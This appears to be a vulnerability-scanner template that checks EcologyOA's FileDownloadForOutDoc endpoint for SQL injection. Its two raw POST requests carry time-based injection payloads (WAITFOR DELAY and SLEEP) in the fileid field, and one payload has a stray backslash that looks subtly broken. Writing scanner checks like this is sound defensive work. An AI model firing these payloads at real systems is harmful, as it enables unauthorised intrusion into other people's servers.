id: ecology-oa-filedownloadforoutdoc-sqli
info:
  author: test
  description: EcologyOA filedownloadforoutdoc interface has SQL injection
  name: EcologyOA filedownloadforoutdoc - SQL injection
  severity: critical
  tags: ecology-oa,sqli
requests:
- matchers:
  - dsl:
    - duration>=5
    type: dsl
  raw:
  - "POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1\nHost: {{Hostname}}\n\
    Accept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\
    Content-Length: 46\nContent-Type: application/x-www-form-urlencoded\nUser-Agent:\
    \ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\
    \ Chrome/83.0.4103.116 Safari/537.36\n\nisFromOutImg=1&fileid=2+WAITFOR\_DELAY+'0:0:5'\
    \  "
  - "POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1\nHost: {{Hostname}}\n\
    Accept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\
    Content-Type: application/x-www-form-urlencoded\nConnection: close        \n\n\
    isFromOutImg=1&fileid=1+AND(SLEEP(6))\n"
